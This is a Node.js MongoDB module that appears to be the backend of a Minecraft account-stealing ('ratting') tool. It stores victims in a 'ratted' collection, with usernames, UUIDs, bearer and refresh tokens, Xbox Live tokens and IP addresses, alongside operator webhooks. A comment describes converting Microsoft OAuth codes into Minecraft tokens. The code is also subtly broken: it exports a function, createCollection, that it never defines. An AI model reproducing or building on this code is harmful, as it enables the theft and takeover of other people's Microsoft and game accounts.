const { MongoClient } = require("mongodb");
const config = require("../config.json");

const currentdate = new Date();

const client = new MongoClient(config.mongodb.connectionstring, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  });

//turn microsoft azure "code" into mincraft token with xbox live scope in a function that returns the value of uuid and baeer token



  async function addUser(apikey, webhook) {
    try {
      await client.connect();
      const database = client.db("users");
      const collection = database.collection("users");
      await collection.updateOne(
        { apiKey: apikey },
        { $set: { redirect: null, webhook: webhook } },
        { upsert: true }
      );
    } catch (err) {
      console.log(err.stack);
    }
  }

  async function getWebhook(apikey) {
    await client.connect();
    try {
      const database = client.db("users");
      const collection = database.collection("users");
      const result = await collection.findOne({ apiKey: `${apikey}` });
      client.close();
      return result.webhook;
    } catch (err) {
      console.log(err.stack);
    }
  }
  
  async function updateUser(username, uuid, BearerToken, refresh_token, ip, UserToken, randomkey) {
    try {
      await client.connect();
      const database = client.db("users");
      const collection = database.collection("ratted");
      await collection.updateOne(
        { username: username },
        {
          $set: {
            username: username,
            uuid: uuid,
            token: BearerToken,
            refresh: refresh_token,
            ip: ip,
            xbl: UserToken,
            authkey: randomkey,
            date: currentdate,
          },
        },
        { upsert: true }
      );
    } catch (err) {
      console.log(err.stack);
    }
  }

  
  module.exports = {
    createCollection,
    addUser,
    getWebhook,
    updateUser
  };